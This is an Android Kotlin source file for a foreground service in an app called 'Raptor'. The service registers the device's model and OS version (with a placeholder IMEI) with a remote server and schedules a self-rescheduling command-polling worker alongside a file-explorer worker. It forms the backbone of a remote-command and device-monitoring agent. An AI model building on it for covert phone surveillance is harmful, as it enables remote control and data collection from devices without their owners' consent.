package com.seuvillage.raptor.background

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.Constraints
import androidx.work.ExistingWorkPolicy // Alterado para ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder // Alterado para OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.seuvillage.raptor.R
import com.seuvillage.raptor.data.Device
import com.seuvillage.raptor.network.RetrofitClient
import com.seuvillage.raptor.workers.CommandWorker
import com.seuvillage.raptor.workers.FileExplorerWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class FileService : Service() {

    private val NOTIFICATION_CHANNEL_ID = "raptor_channel"
    private val NOTIFICATION_ID = 1
    private val TAG = "FileService"
    private val serviceScope = CoroutineScope(Dispatchers.IO)

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)

        registerDevice()
        // Agende o CommandWorker como um OneTimeWorkRequest inicial
        // Ele se auto-agendará para execuções futuras
        scheduleInitialCommandWorker()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Raptor Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Raptor em execução")
            .setContentText("Monitorando e coletando informações do dispositivo")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .build()
    }

    private fun registerDevice() {
        serviceScope.launch {
            try {
                val imei = "TEST_IMEI_12345"
                val model = Build.MODEL
                val androidVersion = Build.VERSION.RELEASE
                val ip = "N/A"

                val device = Device(imei, model, androidVersion, ip)
                val response = RetrofitClient.instance.registerDevice(device)

                if (response.isSuccessful) {
                    Log.d(TAG, "Dispositivo registrado/atualizado com sucesso! IMEI: $imei")
                } else {
                    val errorBody = response.errorBody()?.string()
                    Log.e(TAG, "Falha ao registrar/atualizar dispositivo. Código: ${response.code()}, Mensagem: ${response.message()}, Erro body: $errorBody")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Exceção ao registrar dispositivo: ${e.message}", e)
            }
        }
    }

    // Agenda a primeira execução do CommandWorker como OneTimeWorkRequest
    private fun scheduleInitialCommandWorker() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val commandWorkRequest = OneTimeWorkRequestBuilder<CommandWorker>()
            .setConstraints(constraints)
            .setInitialDelay(0, TimeUnit.SECONDS) // Começa imediatamente
            .build()

        WorkManager.getInstance(this).enqueueUniqueWork(
            "CommandWorker", // Nome único para que o WorkManager gerencie esta tarefa
            ExistingWorkPolicy.REPLACE, // Substitui a tarefa se ela já existir
            commandWorkRequest
        )
        Log.d(TAG, "CommandWorker agendado inicialmente como OneTimeWorkRequest.")
    }

    override fun onDestroy() {
        super.onDestroy()
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.cancel(NOTIFICATION_ID)
        Log.d(TAG, "FileService destruído. Notificação removida.")
    }
}
